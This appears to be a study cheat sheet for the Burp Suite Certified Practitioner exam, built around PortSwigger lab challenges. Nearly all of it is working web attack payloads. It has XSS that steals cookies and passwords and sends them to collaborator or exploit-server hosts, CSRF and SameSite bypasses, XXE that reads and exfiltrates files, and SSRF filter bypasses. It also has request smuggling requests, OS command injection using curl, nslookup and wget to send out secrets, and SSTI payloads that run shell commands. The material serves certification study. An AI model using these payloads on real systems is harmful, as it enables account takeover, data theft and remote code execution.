# Useful info for BSCP
## Extensions for Burp Suite:
* Active Scan++
* Hackvertor
* Collaborator Everywhere
* HTTP Request Smuggler
* Scan manual insertion point
* JWT Editor
* InQL - GraphQL Scanner
* Content Type Convertor
* Server-Side Prototype Pollution Scanner
* DOM Invader (burp browser)

## Tips:
1. Use targeted scan (in Intruder highlight insertion point and use option run targeted scan)   
2. Passas much mystery labs as possible and note and repeat those with mistakes  
3. Review all labs solutions  

## XSS
1. If "Search" or "Comments" functionality is present - scan them for XSS.  

### Payloads
1. DOM XSS in document.write sink using source location.search inside a select element:  
* Add parameter to URL `product?productId=1&storeId=kek` and check out it is in dropbox on the product site. Check HTML code and find out, that storeId is in `<select>` tag. Create the next payload:
```
storeId=kek"></select><script>alert(1)</script>
```
Adapted version:
```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```
2. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded.  
```
{{constructor.constructor('alert(1)')()}}
```
Adapted version:
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```
3. Reflected DOM XSS  
```
\"-alert()}//
```
Adapted:
```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```
4. Stored DOM XSS  
Function replaces first angle brakets only:
```
<><img src=1 onerror=alert(1)>
```
Adapted:
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```
5. Exploiting cross-site scripting to steal cookies  
```
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```
6. Exploiting cross-site scripting to capture passwords  
You can create new form in comment section to steal passwords
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
7. Exploiting XSS to perform CSRF  
There is protection against CSRF, so we need to use the other user's CSRF token in our payload
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```
8. Reflected XSS into HTML context with most tags and attributes blocked  
BruteForce all tags by using xss cheat-sheet, then:
```
<iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
Adapted:
```
<script>
location = 'https://kek.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>

ULR Encoded:

<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```
9. Reflected XSS into HTML context with all tags blocked except custom ones  
```
<script>
location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```
Adapted:
```
<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x

ULR Encoded:

%3Cxss%20id=x%20onfocus=document.location=%22http://burp.oastify.com/?c=%22+document.cookie%20tabindex=1%3E#x
```
10. Reflected XSS with some SVG markup allowed  
```
<svg><animatetransform onbegin=alert(1)> 
```
Adapted:
```
<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;>

URL Encoded:

%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;%3E
```
11. Reflected XSS in canonical link tag  
```
'accesskey='x'onclick='alert(1)
```
12. Reflected XSS into a JavaScript string with single quote and backslash escaped  
```
</script><script>alert(1)</script>
```
Adapted:
```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```
13. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped  
```
\';alert(1);//
\'-alert(1)//
```
Adapted:
```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```
14. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped  
```
http://foo?&apos;-alert(1)-&apos;
```
15. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
```
${alert(1)}
```
### Bypasses:
```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```

```
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
## SQL injections
If you have `Advanced Search` page on your exam, you are more likely about to get easy priv escalation.  
Also check `TrackingId` cookie  
Run `sqlmap` with risk 3 and level 5  
Also SQL injection vector could be potentially found in XML (stock check functionality) and it would not be found with sqlmap. We need to exploit it using Hackvertor entity encoding:
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
## CSRF
Arises in update email functionality  
Potentially the main goal of CSRF is to change admin's mail and then reset his password.  
Generate CSRF PoC of update-email page with Burp and try to bypass restrictions:
* Сhange request method.
* Just delete CSRF token.
* Before using CSRF token in request, check it in HTML code and perform a CSRF attack with it.
More complex cases:
1. CSRF where token is tied to non-session cookie  
Observe LastSearchTerm in Set-Cookie header. Change it to `/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY` and create the next payload to set this key to victim:
```
<script>
location="https://xxx.web-security-academy.net/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```
Now simply generate CSRF PoC and send it.
2. CSRF where token is duplicated in cookie  
Same as previous:
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```
3. SameSite Lax bypass via method override  
Change request method to GET and add `_method=POST` parameter:
```
/my-account/change-email?email=ww%40gmail.com&_method=POST
```
4. SameSite Strict bypass via client-side redirect  
```
/post/comment/confirmation?postId=7../../../my-account/change-email?email=ww%40gmail.com%26submit=1
```
5.  SameSite Strict bypass via sibling domain  
Observe there is `cms-xxx.web-security-academy.net` domain. Craft the next payload and full URL-encode it.
```
<script>
    var ws = new WebSocket('wss://your-websocket-url/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
Create next payload and send it to victim:
```
<script>
location="https://cms-xxx.web-security-academy.net/login?username=URL-ENCODED-PAYLOAD&password=peter"
</script>
```
6. SameSite Lax bypass via cookie refresh  
Create CSRF PoC. Send it to victim once, wait 5-10 seconds and send it again.
7. CSRF Refresh Password isloggedin true  
Observer username and stayloggedin values in cookie  
Create POST request to change password or email and add `X-Forwarded-Host`, `X-Host`, `X_Forwarded-Server` pointing to exploit server  
Add a parameter `username=administrator` to request's body and send it  
## Clickjacking

## DOM-based vulnerabilities
Use `DOM Invader`  
### Exploits
1. DOM XSS using web messages  
Notice that the home page contains an `addEventListener()` call that listens for a web message  
```
<iframe src="//0a8100fe032e3917c66ead67003c0020.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.  
2. DOM XSS using web messages and a JavaScript URL  
```
<iframe src="https://0a2d00d604a3acfbc67064610056003c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```
3. DOM XSS using web messages and JSON.parse  
```
<iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
4. DOM-based open redirection  
```
https://0ae900830459749cc2465788006000b5.web-security-academy.net/post?postId=7&url=https://exploit-0ab30006040d744dc2a7561101df00f9.exploit-server.net/exploit#
```
5. DOM-based cookie manipulation  
```
<iframe src="https://0a1100e803937b60c6874ab7003b00b5.web-security-academy.net/product?productId=1&'><script>print()</script>">
```
## CORS and info disclosure
For CORS check Access-Control-Allow-Credentials headers in responses  
For injo disc use smth of this:
```
dirb -u <url>
ffuf -u http://kek.com/FUZZ -w /usr/share/dirb/wordlists/big.txt -t 50 -c
gobuster dir -u http://kek.com -w /usr/share/dirb/wordlists/common.txt
```
### Exploits
1. CORS vulnerability with trusted insecure protocols  
Observe Access-Control-Allow-Credentials header in /accountDetails  
Put Origin: stock.lab-id header  
Go to your exploit server and create malicious payload to send admin's api key to ur server:
```
<script>
location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
2. Git disclosure  
```
wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
```
## XXE
The main tip is to scan the whole (not targeted!) request to, usually, /product/stock check  
### Exploits
1. Blind XXE with out-of-band interaction via XML parameter entities  
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
2. Exploiting blind XXE to exfiltrate data using a malicious external DTD  
Observe Submit feedback, paste xml file with the next content:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Check /product/stock page and paste the next XXE payload:
```
<!DOCTYPE stockcheck [<!ENTITY % io7ju SYSTEM "http://localhost:44901/feedback/screenshots/7.xml">%io7ju; ]>
```
3. Exploiting blind XXE to retrieve data via error messages  
Observe Submit feedback, paste xml file with the next content:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Check /product/stock page and paste the next XXE payload:
```
<?xml version="1.0" encoding="UTF-8" standalone='no'?><!DOCTYPE stockcheck [<!ENTITY % io7ju SYSTEM "http://localhost:41717/feedback/screenshots/1.xml">%io7ju; ]>
```
This will referrer to localhost with our previously created file and get content of /etc/passwd via error message.
4. Exploiting XInclude to retrieve files  
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
5. Admin user import via XML  
```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
    </user>
</users>
```
## SSRF
If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.  
[ipconverter](https://h.43z.one/ipconverter/)  
### SSRF Bypass:
```
http://2130706433 instead of http://127.0.0.1
Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
Octal Encoding 127.0.0.1 translates to 0177.0.0.01
Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1
http://127.1
```
### Internal Network addresses in CIDR
```
10.0.0.0/8
127.0.0.1/32
172.16.0.0/12
192.168.0.1/16
```
### Exploits
Like XML, the place to find SSRF is at /product/stock check and Host headers
1. Basic SSRF against another back-end system  
```
stockApi=http://192.168.0.34:8080/admin
```
2. SSRF with blacklist-based input filter  
```
stockApi=http://127.1/AdMiN/
```
3. SSRF with filter bypass via open redirection vulnerability  
```
stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
```
4. Blind SSRF with out-of-band detection  
```
Referer: http://burpcollaborator
```
5. SSRF with whitelist-based input filter  
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
```
## HTTP request smuggling
Use HTTP Request Smuggler extension for BurpSuite to check (`Smuggle probe`), if there are any possible smugglings and then construct the payload  
### Exploits
1. Use unsupported Method GPOST (CL.TE)  
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencodedPOST / HTTP/1.1
Host: 0a6f008e04ed8481c035778000dc0063.web-security-academy.net
Cookie: session=QjB6AgSHTuzJSZCHdc0al2SJSOtdc5bh
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
tRANSFER-ENCODING: chunked

3
x=y
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
2. Use unsupported Method GPOST (TE.CL)  
```
POST / HTTP/1.1
Host: 0a4d007b048d4832c0afb01800b700ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
3. Obfuscating TE.TE  
```
POST / HTTP/1.1
Host: 0a8800ee047d6d24c0c255e700a6009c.web-security-academy.net
Connection: close
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
4. Detecting CL.TE  
```
POST / HTTP/1.1
Host: 0a6f00870409bd9bc05054ca00c900d9.web-security-academy.net
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```
5. Get other user's request to steal cookie  
```
POST / HTTP/1.1
Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
tRANSFER-ENCODING: chunked

0

POST /post/comment HTTP/1.1
Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
Cookie: session=N2dqf1wUAKs2U79D8Kb9d3ROkWblLydg
Content-Length: 814
Content-Type: application/x-www-form-urlencoded
Connection: close

csrf=nyDg9uHq32xSredK0gaIuHeyk21sESN8&postId=2&name=wad&email=rei%40gmail.com&website=https://kek.com&comment=LEL
```
6. Exploiting HTTP request smuggling to deliver reflected XSS  
```
POST / HTTP/1.1
Host: 0a5800fa04974f1bc15f0dab004400ef.web-security-academy.net
Cookie: session=3MNdX218m6gxqn82BLl4dxpx3eCLNd8i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
tRANSFER-ENCODING: chunked

3
x=y
0

GET /post?postId=10 HTTP/1.1
User-Agent: kek"><img src=123 onerror=alert(1)>
Foo: x
```
7. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability  
```
POST / HTTP/1.1
Host: 0a6f008e04ed8481c035778000dc0063.web-security-academy.net
Cookie: session=QjB6AgSHTuzJSZCHdc0al2SJSOtdc5bh
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
tRANSFER-ENCODING: chunked

3
x=y
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
### Bypasses
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked  
Transfer-Encoding: x  

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow
```
## OS command injection
The place to find OS Injection is in Submit Feedback page, usually in email input, but, just in case, scan the other inputs too
```
email=||curl+burp.oastify.com?c=`whoami`||
nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
```
### Exploits
1. Blind OS command injection with time delays  
```
email=x||ping+-c+10+127.0.0.1||
```
2. Blind OS command injection with output redirection  
```
email=||whoami>/var/www/images/output.txt||
filename=output.txt
```
3. Blind OS command injection with out-of-band interaction  
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```
4. Blind OS command injection with out-of-band data exfiltration  
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
5. Admin Panel ImgSize command injection  
```
/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
Or  
ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
```
## SSTI
SSTI is a direct road to RCE  
Complexity can only arise when searching for the language in which the code was written  
We iterate over template expressions `({{7*7}}, ${7*7},<% = 7*7 %>, ${{7*7}}, #{7*7}, *{7*7})`  
If one of this works, go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and look for all technologies that use this expression  
In case `{{7*7}}` only God can tell you what kind of technology it is.  
Also scan with Burp Scanner  
Arises at View Details with reflected phrase `Unfortunately this product is out of stock`  
### Exploits
1. Basic server-side template injection  
Ruby
```
<%= system("rm+morale.txt") %>
```
2. Basic server-side template injection (code context)  
```
blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
```
3. SSTI using documentation  
Java Freemaker
```
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```
4. SSTI in an unknown language with a documented exploit  
NodeJS Handlebars [exploit](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
5. SSTI with information disclosure via user-supplied objects  
Python Jinja2
```
{{settings.SECRET_KEY}}
```
6. Admin panel Password Reset Email SSTI  
Jinja2
```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```
## Directory traversal
Just scan with Burp  
If you can get /etc/passwd, but cannot get /home/carlos/secret (maybe WAF is blocking the word secret), just URL-Encode the whole payload (even with /home/carlos/secret) like this:
```
/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```
Arises at `/image?filename=`
recommend you to turn on images inspection in proxy setting to easily detect this type  
### Exploits
1. File path traversal, traversal sequences blocked with absolute path bypass  
```
/image?filename=/etc/passwd
```
2. File path traversal, traversal sequences stripped non-recursively  
```
/image?filename=..././..././..././etc/passwd
```
3. File path traversal, traversal sequences stripped with superfluous URL-decode  
```
Double URL-encode ../../../etc/passwd
(e.g. %252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd)
It is recommended to use cyberchef to encode
```
4. File path traversal, validation of start of path  
```
/image?filename=/var/www/images/../../../../etc/passwd
```
5. File path traversal, validation of file extension with null byte bypass  
```
../../../../../../etc/passwd%00.jpg
```
## Access control vulnerabilities
Look for potential IDORs and some additional response fields from servers
### Exploits
1. User role can be modified in user profile  
When changing e-mail, check for roleid in response  
Add it to your request and change it to 2  
Also if it doesn't work, brute numbers from 0 to 100  
2. URL-based access control can be circumvented  
```
X-Original-Url: /admin
```
## Authentication
Use Burp's usernames and paswords dictionaries  
## Exploits
1. Simple 2FA Bypass  
```
Just try to access the next endpoint directly (you need to know the path of the next endpoint) e.g. /my-account
If this doesn’t work, try to change the Referrer header as if you came from the 2FA page 
```
2. Password reset broken logic  
Change username in POST request after password-reset link
```
temp-forgot-password-token=MgFMne17hOm2WM5BMHyVzvEewBFOwnyc&username=carlos&new-password-1=w&new-password-2=w
```
3. User Enumeration with Different Responses  
Just look at difference in responses
4. User Enumeration with Different Response Time  
Just look at difference in response time  
Also for this lab you need to set X-Forwarded-For header to bypass login restrictions
5. Broken brute-force protection, IP block  
You can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached. For example create a combined list with your valid credentials and with victim's creds:
```
wiener - peter
carlos - kek
carlos - kek2
wiener - peter
carlos - kek3 etc...
```
6. Username enumeration via account lock  
It blocks only existing accounts, so try to brute the same list of passwords until one of accounts from the list is not blocked.  
To brute password use grep with errors to find a request without error
7. 2FA broken logic  
Observe there is verify=wiener in cookie while sending 2FA code  
Change it to our victim's nickname and simply brute 2FA code
8. Brute-forcing a stay-logged-in cookie  
Observe stay logged in function. Check cookie and observe that it is base64 encoded version of USERNAME:(md5)PASSWORD  
Create a list of md5 hashed passwords and brute cookies
9. Offline password cracking  
Steal cookie in comment section via XSS: 
```
<script>document.write('<img src="https://exploit-server?c='+document.cookie+'" />');</script>
```
Crack MD5 hash via john the ripper or web services
10. Password reset poisoning via middleware  
While processing forgot password set new header:
```
X-Forwarded-Host: exploit-server 
```
It will process Host Header Injection
11. Password brute-force via password change  
While processing password changing, observe that you can change nickname.
Change it to victim's one and brute his password